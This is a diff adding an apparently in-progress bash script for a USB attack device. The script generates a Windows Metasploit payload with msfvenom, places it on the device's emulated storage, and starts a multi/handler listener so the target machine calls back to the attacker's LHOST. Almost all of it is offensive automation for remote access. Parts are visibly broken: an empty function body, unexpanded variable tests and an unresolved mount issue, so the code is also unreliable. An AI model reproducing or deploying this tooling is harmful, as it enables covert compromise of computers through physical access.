@@ -1,0 +1,66 @@
+
+USE_ECM=true          # communication
+USE_RNDIS=false       # windows only for now
+USE_HID=true          # payload execution
+USE_RAWHID=true       # payload execution
+USE_UMS=true          # payload delivery
+
+source msf_config.txt
+
+function startRegularHandler(){
+	echo "starting postgresql... "
+	sudo systemctl start postgresql
+	echo "starting msfconsole/handler... "
+	sleep 2
+	#this takes a while and cant be run async because of some bug with screen -d that terminates screen after msfconsole started
+	screen -dmS msfconsole bash -c " \
+		source ~/.bash_profile; \
+		cd $MSFPATH;echo 'starting msfconsole, this might take a while....'; \
+		./msfconsole -L -x ' \
+			load msfd; \
+			use exploit/multi/handler; \
+			set PAYLOAD $PAYLOAD; \
+			set LHOST $LHOST; \
+			set LPORT $LPORT; \
+			exploit -j; \
+			' \
+		"
+		#msfd gets loaded for easier direct access
+}
+
+function prepPayloadGen(){
+	# ==================================
+	# Possible Veil Evasion integration
+	# ==================================
+	echo "mounting driveImage"
+	mkdir $wdir/USB_STORAGE/mount
+	sudo mount $wdir/USB_STORAGE/image.bin
+	# mount/ is owned by root and cant be changed, am I doing something wrong?
+	#payload generation:
+	msfvenomGeneration
+	executePayload
+}
+
+function msfvenomGeneration() {
+	sudo $MSFPATH/msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT URIPATH=$URIPATH -f exe -o $wdir/USB_STORAGE/mount/payload.exe
+	#^look above
+}
+
+function executePayload() {
+	#there is a whole hak5 episode about using the bashbunny to extract files and putting them on the usb drive which contains the documentation for this technique
+}
+
+function onLogin() {
+	if [ FIRE_ON_BOOT -eq false ];then
+		executePayload
+	fi
+	screen -r genericHandler
+}
+
+function onNetworkUp() {
+	prepPayloadGen
+	startRegularHandler
+	if [ FIRE_ON_BOOT -eq true ];then
+		executePayload
+	fi
+}
